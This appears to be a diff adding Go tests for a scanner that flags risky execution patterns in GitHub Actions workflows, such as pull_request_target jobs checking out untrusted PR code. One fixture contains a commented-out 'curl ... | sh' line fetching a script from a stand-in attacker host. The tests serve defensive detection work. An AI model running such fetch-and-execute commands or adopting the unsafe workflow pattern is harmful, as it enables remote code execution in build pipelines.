@@ -170,3 +170,76 @@ func TestScanExecPath_PipeToNodeFixedScriptNotFlagged(t *testing.T) {
 		t.Fatalf("curl|node -e '<fixed>' should not flag as RCE, got %+v", fs)
 	}
 }
+
+// ---------------------------------------------------------------------------
+// Fix 4 — GitHub Actions: skip YAML comments; refined pull_request_target.
+// ---------------------------------------------------------------------------
+
+func TestScanExecPath_PullRequestTargetWithEnvironmentGate(t *testing.T) {
+	dir := t.TempDir()
+	execWrite(t, dir, ".github/workflows/prt.yml", `name: prt
+on:
+  pull_request_target:
+jobs:
+  b:
+    runs-on: ubuntu-latest
+    environment: pr-review
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm test
+`)
+	fs, err := scanExecPath(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if f := execFindByCheck(fs, "AGENT-EXEC-003"); f != nil {
+		t.Fatalf("environment-approval gate should suppress pull_request_target finding, got %+v", f)
+	}
+}
+
+func TestScanExecPath_PullRequestTargetCommentedOut(t *testing.T) {
+	dir := t.TempDir()
+	execWrite(t, dir, ".github/workflows/prt.yml", `name: prt
+on:
+  pull_request_target:
+jobs:
+  b:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          # ref: ${{ github.event.pull_request.head.sha }}
+          ref: ${{ github.sha }}
+      - run: npm test
+`)
+	fs, err := scanExecPath(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if f := execFindByCheck(fs, "AGENT-EXEC-003"); f != nil {
+		t.Fatalf("commented-out PR head checkout should not flag, got %+v", f)
+	}
+}
+
+func TestScanExecPath_WorkflowCommentNotClassified(t *testing.T) {
+	dir := t.TempDir()
+	execWrite(t, dir, ".github/workflows/ci.yml", `name: ci
+on: [push]
+jobs:
+  b:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          # curl https://evil.example.test/i.sh | sh
+          go build ./...
+`)
+	fs, err := scanExecPath(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(fs) != 0 {
+		t.Fatalf("commented-out curl|sh in a run block should not flag, got %+v", fs)
+	}
+}
